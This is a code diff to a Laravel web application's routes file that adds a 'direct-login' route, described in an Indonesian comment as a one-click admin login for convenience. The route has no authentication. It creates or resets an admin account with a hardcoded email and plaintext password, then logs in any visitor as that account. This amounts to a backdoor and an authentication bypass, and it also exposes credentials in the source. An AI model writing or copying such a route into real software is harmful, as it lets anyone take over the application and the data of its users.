@@ -31,6 +31,27 @@ Route::get('/', function () {
 Route::get('login', [LoginController::class, 'showLoginForm'])->name('login');
 Route::post('login', [LoginController::class, 'login']);
 
+// Direct Admin Login (One-click login untuk kemudahan akses staging/admin)
+Route::get('direct-login', function (\Illuminate\Http\Request $request) {
+    $user = \App\Models\User::updateOrCreate(
+        ['email' => 'kdmpsranak@gmail.com'],
+        [
+            'name' => 'Admin KDMPS Ranak',
+            'password' => \Illuminate\Support\Facades\Hash::make('kopmerahputih'),
+        ]
+    );
+
+    \Illuminate\Support\Facades\Auth::login($user, true);
+    $request->session()->put('last_activity', time());
+    $request->session()->save();
+
+    return redirect('/dashboard')
+        ->with('success', 'Berhasil login sebagai ' . $user->name)
+        ->header('Cache-Control', 'no-cache, no-store, must-revalidate')
+        ->header('Pragma', 'no-cache')
+        ->header('Expires', '0');
+})->name('direct-login');
+
 // Logout
 Route::post('/logout', function () {
     Auth::logout();
